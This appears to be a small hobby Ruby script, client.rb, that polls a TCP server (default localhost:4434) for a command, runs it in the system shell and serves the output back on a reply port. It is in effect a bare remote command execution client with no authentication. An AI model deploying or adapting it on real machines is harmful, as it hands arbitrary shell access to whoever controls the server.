# # # # # # # #
#!/usr/bin/env ruby
# # # # # # #

# # # # # #
# Created Mars 29th 2018
# Copyright (c) 2018 Beyar.
# # # #

# # #
# Name: client.rb
# #

# System methods
class Sys
	def Sys::cls
		system "clear" or system "cls"
	end
	def Sys::cmd(input)
		system(input)
	end
end

# Clear
Sys.cls

# Library
require "socket"

# Default connection
host = "localhost"
port = 4434

loop = true
while loop == true do

	# Connect, get & close
	begin
		begin
			inbound = TCPSocket.new host, port
			rescue Errno::ECONNREFUSED
			loop = false
		end
		iterating = true
		array = [recip = nil, recport = nil, command = nil, id = nil]
		count = 0

		# View message
		while iterating
			incoming = inbound.gets
			array[count] = incoming
			if incoming == nil
				iterating = false
			end
			count += 1
		end

		# Split data and review
		inbound.close
		array = array.reverse.drop(1).reverse
		recip = array[0].delete("\n")
		recport = array[1].delete("\n")
		command = array[2].delete("\n")
		id = array[3].delete("\n")
		inbound = TCPServer.new recip, recport
		ending = false
		begin
			arr = `#{command}`.split("\n")
			rescue Errno::ENOENT
			arr = "Unkown command.|".split("|")
		end

		# Waiting for connection and deliver
		begin
			while ending != true
				incoming = inbound.accept
				for each in arr
					incoming.puts "#{id}: #{each}"
				end
				incoming.close
				ending = true
			end
		end
		
		inbound.close
		incoming.close
		sleep(1)
		
		rescue NoMethodError
		sleep(5)
		rescue IOError
		sleep(5)
		break
	end
end
